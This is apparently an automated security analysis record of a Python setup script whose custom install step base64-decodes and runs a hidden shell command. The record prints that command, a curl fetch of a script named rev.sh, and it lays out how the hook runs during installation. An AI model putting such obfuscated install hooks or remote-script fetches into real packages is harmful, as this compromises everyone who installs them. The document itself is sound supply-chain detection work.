  "purpose": "Define a Python package setup with custom installation and development commands that execute hidden code during installation.",
  "sources": "The function b64d() which decodes a base64 string, and the call to os.system() with decoded code.",
  "sinks": "The os.system() call executing decoded base64 content, potentially leading to remote code execution or network activity.",
  "flows": "The setup process calls AfterInstall.run() during installation, which invokes notmalfunc(). This decodes the base64 string and executes it via os.system().",
  "anomalies": "Use of base64 decoding and os.system() in a setup script suggests obfuscation and potential malicious intent. The base64 string decodes to 'curl http://localhost/rev.sh', which indicates downloading and executing a remote script.",
  "analysis": "The code imports standard setup tools and defines functions for base64 decoding. The key function notmalfunc() decodes a base64 string that, when decoded, is 'curl http://localhost/rev.sh'. This command is executed in the system shell during the install process via the AfterInstall class. The presence of this obfuscated remote script fetch indicates malicious behavior. No other suspicious code or backdoors are present, but the execution of remote commands during package install is highly suspicious.",
  "conclusion": "The setup script includes obfuscated code that executes a remote 'curl' command during installation, indicating malicious intent to fetch and run potentially harmful scripts. This is a security risk and a supply chain attack vector.",
